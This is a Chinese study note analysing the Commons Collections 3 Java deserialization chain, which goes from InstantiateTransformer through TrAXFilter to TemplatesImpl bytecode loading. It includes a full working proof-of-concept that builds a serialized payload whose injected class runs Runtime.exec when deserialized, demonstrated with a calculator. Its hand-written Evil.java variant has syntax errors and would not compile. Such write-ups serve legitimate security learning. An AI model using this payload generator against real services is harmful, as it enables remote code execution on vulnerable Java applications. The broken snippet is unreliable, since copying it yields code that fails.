---
title: CC3链分析
description: Commons Collections 3 反序列化链，通过 InstantiateTransformer + TrAXFilter 调用 TemplatesImpl.newTransformer() 加载恶意字节码
tags: [cc3, commons-collections, deserialization, instantiatetransformer, traxfilter, templatesimpl]
status: 已完成
finish-date: 2026-05-20
difficulty: 困难
---

# CC3链
## 核心思路：通过调用TemplatesImpl.newTransformer()方法完成对恶意类的加载
## CC3延用CC1的触发模式
通过LazyMap.get()触发Transformer链的执行，核心改进是CC3的执行模式不再是通过InvokerTransformer执行任意方法，而是通过InstantiateTransformer去实例化TrAXFilter类。TrAXFilter的构造函数会调用TemplatesImpl的newTransformer方法从而触发加载并执行预先注入的恶意字节码
## 调用链
```
AnnotationInvocationHandler.readObject()
|
handler2.entrySet()
    |
    handler1.invoke()
        |
        LazyMap.get()
        |
        ChainedTransformer.transform()
            |
            ConstantTransformer.transform()     -->返回TrAXFilter.class
            |
            InstantiateTransformer.transform()  
                | 
                TrAXFilter构造函数
                    |
                    TemplatesImpl.newTransformer()
                    |
                    TemplatesImpl.getTransletInstance()
                    |
                    TemplatesImpl.defineTransletClasses()
                    |
                    TransletClassLoader.defineClass()
                        |
                        实例化恶意类，执行静态代码块或构造函数中的代码
```
## 调用链中的方法源码分析
1. InstantiateTransformer.transform()
    ```java
    // org.apache.commons.collections.functors.InstantiateTransformer
    public Object transform(Object input) {
        // 调用 iParamTypes 对应的构造函数
        return constructor.newInstance(iArgs);
    }
    ``` 
    InstantiateTransformer的transform方法可以调用任意类的有参构造函数
2. TrAXFilter的构造函数
    ```java
    // com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter
    public TrAXFilter(Templates templates) throws TransformerConfigurationException {
        _templates = templates;
        // 关键：构造函数里直接调用 newTransformer
        _transformer = (TransformerImpl) templates.newTransformer();
        // ...
    }
    ``` 
3. TemplatesImpl.newTransformer()
    ```java
    public synchronized Transformer newTransformer() throws TransformerConfigurationException {
        // ... 各种检查
        Translet translet = getTransletInstance();
        // ...
    }
    ```
    public方法newTransformer()会调用私有getTransletTnstance方法
4. TemplatesImpl.getTransletInstance()
    ```java
    private Translet getTransletInstance() throws TransformerConfigurationException {
        if (_name == null) return null;
        if (_class == null) defineTransletClasses();  // ← 关键
        // ...
    }
    调用私有方法defineTransletClasses()
5. TemplatesImpl.defineTransletClasses()
    ```java 
    private void defineTransletClasses() throws TransformerConfigurationException {
        // ...
        TransletClassLoader loader = new TransletClassLoader(_tfactory);
        for (int i = 0; i < classCount; i++) {
        // 这里调用 defineClass
        _class[i] = loader.defineClass(_bytecodes[i]);
        }
    }
    ``` 
    会调用自定义类加载器TransletClassLoader的defineClass方法加载恶意字节码
## 方法调用思路
```
能够加载恶意字节码的核心方法是自定义的ClassLoader.defineClass()
|
TemplatesImpl中的自定义类TransletClassLoader会调用defineClass()，但defineClass 是 package-private因此需要找到TemplatesImpl中谁可以调用defineClass()
|
TemplatesImpl中defineTransletClasses()调用了TransletClassLoader.defineClass()，但defineTransletClasses()也是私有的因此还需要找到TemplatesImpl中谁可以调用defineTransletClasses()
|
getTransletInstance()会调用defineTransletClasses()，但getTransletInstance()也是私有的还需要在TemplatesImpl中寻找
|
找到了TemplatesImpl.newTransformer()，该方法会调用getTransletInstance()，而且是public的
|
接下来寻找哪些类会调用newTransformer()
|
发现TrAXFilter的构造方法会调用newTransformer()。这是个公开类，构造函数参数是 Templates 类型（TemplatesImpl 实现了这个接口）如果能实例化 TrAXFilter，就能触发 newTransformer()
|
接下来需要触发TrAXFilter类的构造函数，InstantiateTransformer的transform方法中会通过反射调用有参构造函数
``` 
## 手工编写POC
1. 需要完成什么
   生成恶意字节码（执行命令）
   把字节码注入TemplatesImpl中
   构造InstantiateTransformer+TrAXFilter触发链
   构造AnnotationInvocationHandler+LazyMap入口 
   序列化对象
2. 关键点
   1. 生成恶意字节码（使用javassist）
      ```java
      ClassPool pool = ClassPool.getDefault();
      pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
      CtClass cc = pool.makeClass("Evil");

      // 在静态块中插入命令
      String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
      cc.makeClassInitializer().insertBefore(cmd);

      // 必须继承 AbstractTranslet
      cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));

      // 避免类名重复
      String rename = "Evil" + System.nanoTime();
      cc.setName(rename);

      // 生成字节码
      byte[] bytes = cc.toBytecode();
      byte[][] targetByteCodes = new byte[][]{bytes};         
      ```
      为什么必须要继承AbstractTranslet
      看 TemplatesImpl.defineTransletClasses() 源码：
      ```java
      if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
         _transletIndex = i;  // 只有继承了这个类，才会被标记
      }
      // 后面实例化时，只处理 _transletIndex 对应的类
      ```
   2. 把字节码注入 TemplatesImpl
      ```java
      TemplatesImpl templates = new TemplatesImpl();
      setFieldValue(templates, "_name", "test");
      setFieldValue(templates, "_class", null);
      setFieldValue(templates, "_bytecodes", targetByteCodes);
      setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
      ```
      必须设置的三个字段![](java-deserialization(ing)/2026-05-20-10-27-12.png)
      1. _name：必须不为 null。
      2. _bytecodes：存放着恶意类的字节码。
      3. _tfactory
   3. 构造 InstantiateTransformer
      ```java
      InstantiateTransformer instantiate = new InstantiateTransformer(
         new Class[]{Templates.class},   // 构造函数参数类型
         new Object[]{templates}          // 构造函数参数值
      );

      // 调用时传入 TrAXFilter.class
      instantiate.transform(TrAXFilter.class);
      // 等价于：new TrAXFilter(templates)    
      ```
   4. 构造 Transformer 链
      ```java
      Transformer[] transformers = new Transformer[]{
         new ConstantTransformer(TrAXFilter.class),   // 第一次transform返回TrAXFilter.class
         new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
      };
      ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);         
      ``` 
   5. 挂到 LazyMap 上
      ```java
      Map<Object, Object> map = new HashMap<>();
      Map decorate = LazyMap.decorate(map, chainedTransformer);

      // 触发：decorate.get("某个不存在的key")
      // → chainedTransformer.transform(key)         
      ``` 
3. 完整POC
   ```java
   import com.sun.org.apache.xalan.internal.xsltc.DOM;
   import com.sun.org.apache.xalan.internal.xsltc.TransletException;
   import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
   import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
   import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
   import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
   import javax.xml.transform.Templates;
   import javassist.ClassClassPath;
   import javassist.ClassPool;
   import javassist.CtClass;
   import org.apache.commons.collections.Transformer;
   import org.apache.commons.collections.functors.ChainedTransformer;
   import org.apache.commons.collections.functors.ConstantTransformer;
   import org.apache.commons.collections.functors.InstantiateTransformer;
   import org.apache.commons.collections.map.LazyMap;
   import java.io.*;
   import java.lang.reflect.Constructor;
   import java.lang.reflect.Field;
   import java.lang.reflect.InvocationHandler;
   import java.lang.reflect.Proxy;
   import java.util.HashMap;
   import java.util.Map;

   public class CC3 {
      public static void main(String[] args) throws Exception {
         ClassPool pool =ClassPool.getDefault();
         pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
         CtClass cc=pool.makeClass("Evil");
         String cmd="java.lang.Runtime.getRuntime().exec(\"calc\");";
         cc.makeClassInitializer().insertBefore(cmd);
         cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
         String rename="Evil"+System.nanoTime();
         cc.setName(rename);
         byte[] bytes=cc.toBytecode();
         byte[][] target=new byte[][]{bytes};


         TemplatesImpl templates=new TemplatesImpl();
         Field name= templates.getClass().getDeclaredField("_name");
         name.setAccessible(true);
         name.set(templates, "test");

         Field bytecodes= templates.getClass().getDeclaredField("_bytecodes");
         bytecodes.setAccessible(true);
         bytecodes.set(templates, target);

         Field tfactory= templates.getClass().getDeclaredField("_tfactory");
         tfactory.setAccessible(true);


         ConstantTransformer ct=new ConstantTransformer(TrAXFilter.class);
         InstantiateTransformer it=new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
         ChainedTransformer chain=new ChainedTransformer(new Transformer[]{ct,it});


         HashMap map=new HashMap();
         Map lazy=LazyMap.decorate(map, chain);

         Class<?> clazz=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
         Constructor cons=clazz.getDeclaredConstructor(Class.class, Map.class);
         cons.setAccessible(true);


         InvocationHandler handler1=(InvocationHandler) cons.newInstance(Override.class, lazy);


         Map map1=(Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, handler1);
         Object handler2 = cons.newInstance(Override.class, map1);


         ByteArrayOutputStream baos=new ByteArrayOutputStream();
         ObjectOutputStream oos=new ObjectOutputStream(baos);
         oos.writeObject(handler2);
         oos.close();
         byte[] payload=baos.toByteArray();
         System.out.println("payload length:"+payload.length);


         ByteArrayInputStream bais=new ByteArrayInputStream(payload);
         ObjectInputStream ois=new ObjectInputStream(bais);
         ois.readObject();
         ois.close();
         System.out.println("success");

      }
   }
   ``` 
4. 运行验证，成功弹出计算器![](java-deserialization(ing)/2026-05-20-16-03-59.png)
5. 不使用javassist，手工生成恶意字节码
   ```java
   //Evil.java
   import com.sun.org.apache.xalan.internal.xsltc.DOM;
   import com.sun.org.apache.xalan.internal.xsltc.TransletException;
   import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
   import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
   import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

   public class Evil Extends AbstractTranslet{
      static {
         try{
            Runtime.getRuntime().exec("calc");
         }
         catch{
            Exception e;
         }
      }
      //实现两抽象方法（空实现）
      // 抽象方法1的空实现
         @Override
         public void transform(DOM document, DTMAxisIterator iterator, 
                              SerializationHandler handler) throws TransletException {
            // 空实现：什么都不做
         }
         
         // 抽象方法2的空实现
         @Override
         public void transform(DOM document, SerializationHandler[] handlers) 
                              throws TransletException {
            // 空实现：什么都不做
         }
               
   }


   //将上面的Evil.java文件`javac Evil.java`编译成Evil.class文件

   byte[] bytes=File.readAllBytes(Paths.get("Evil.class"));
   byte[][] target=new byte[][]{bytes};
   ``` 
## 验证ysoserial工具生成的payload
工具生成的payload也可以成功执行命令![](java-deserialization(ing)/2026-05-20-16-08-32.png) 